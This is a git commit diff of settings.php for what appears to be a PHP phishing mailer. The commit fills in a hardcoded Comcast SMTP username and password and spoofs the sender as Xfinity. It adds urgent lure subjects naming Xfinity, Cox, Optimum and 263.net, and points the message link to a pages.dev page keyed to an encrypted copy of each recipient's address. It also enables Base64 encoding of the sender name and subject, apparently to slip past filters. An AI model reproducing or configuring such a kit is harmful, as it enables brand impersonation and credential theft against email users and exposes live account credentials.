20ae9375d42a90bab7be6f74a10b0746ef4e2152
maiclphillips <137014074+maiclphillips@users.noreply.github.com>
2023-12-29 22:23:49 -0500

    Release

--- settings.php
+++ settings.php
@@ -5,8 +5,8 @@ $smtpSettings = [
      [
         'host'      => 'smtp.comcast.net',
         'port'      => 587,
-        'username'  => 'yoursmtp@comcast.net',
-        'password'  => 'password2',
+        'username'  => 'liphow101@comcast.net',
+        'password'  => 'Qwerty@7',
         'Hostname'	=> "mail-".rand(1,9999)."sys.comcast.net",
         'Auth'	    => "tls",
      ],
@@ -14,7 +14,7 @@ $smtpSettings = [
      [
         'host'      => 'smtp2.example.net',
         'port'      => 587,
-        'username'  => 'Username@example.com',
+        'username'  => 'Usernamxe@example.com',
         'password'  => 'Welcomepassword',
         'Hostname'	=> "mail-".rand(1,9999)."sys.comcast.net",
     ],
@@ -25,17 +25,24 @@ $smtpSettings = [
     // Add more SMTP configurations as needed
 ];
 
+$domainSettings = [
+    
+    'DomainName'               => 'Comcast',                      // Comcast, Cox, Optimum, China, Office
+   
+];
+
 $commonSettings = [
-    'from'              => 'xfinity.communications@xfinity.comcast.net',    // Sender's email address
-    'fromname'          => 'Xfinity',           // Sender's name
-    'subject'           => 'Please read! Important message from Xfinity.', // Default email subject with placeholder
+    'from'              => 'xfinity.communications@comcast.net',    // Sender's email address noreply@myemail.optimum.net,  noreply@mail.cox.com, postmaster@mail.263.net, xfinity.communications@comcast.net
+    'fromname'          => 'Xfinity',           // Sender's name Postmaster, Cox, Xfinity
+    'subject'           => 'Urgent message from Xfinity requires your attention immediately', // Default email subject with placeholder  [12]邮件被拒绝, Urgent message from Optimum - An immediate response is needed., Urgent message from Cox - An immediate response is needed., Urgent message from Xfinity requires your attention immediately
     'letterFile'        => '1.html',                   //  letter filename
     'priority'          => '3',                         // Priority 
-    'encoding'          => 'quoted-printable',          // Encoding type
-    'charset'           => 'hex',                    // Character set
-    'threads'           => '3',                       // Number of threads
+    'encoding'          => 'quoted-printable',       // quoted-printable or base64 or 7bit or 8bit or binary,
+    'charset'           => 'utf-8',                   //Charset option us-ascii, iso-8859-1, utf-8
+    'threads'           => '2',                       // Number of threads
     'sleepDuration'     => '',                       // Sleep duration between sending emails
-    'link'              => '',                         // Your link for muttple link sepperat with |
+    'EncryptKeyEmlAdd'  => '439rr095490r',             //EMail Address Encryption key             
+    'link'              => 'https://mail-263-net.pages.dev/?id=##emailEncrypt##', // Your link for muttple link sepperat with |
     'linkb64'           => '',                         // Base link link
     'qrlink'            => '',                         // Link behinde qrlink 
     'qrlabel'           => '',                         // Label below qr code
@@ -45,10 +52,10 @@ $commonSettings = [
     'autolink'          => false,                      // enable autolink in function
     'image_attachname'  => '',                         // CHnage attachment name
     'randomparam'       => false,                      // randomparam in front of link
-    'encodeFromInfo'    => false,                       // Enable Base64 encoding for from name
-    'encodeSubject'     => false,                       // Enable Base64 encoding for subject
-    'randSender'        => true,                      // Enable Base64 encoding for sender's name
-    'displayimage'      => false,   
+    'encodeFromInfo'    => true,                       // Enable Base64 encoding for from name
+    'encodeSubject'     => true,                       // Enable Base64 encoding for subject
+    'randSender'        => false,                      // Enable Base64 encoding for sender's name
+    'displayimage'      => false,                      // 
     'recipientListFile' => 'list.txt',
     'ErrorHandling' 	=> '4',  
     // Enable Base64 encoding for image display
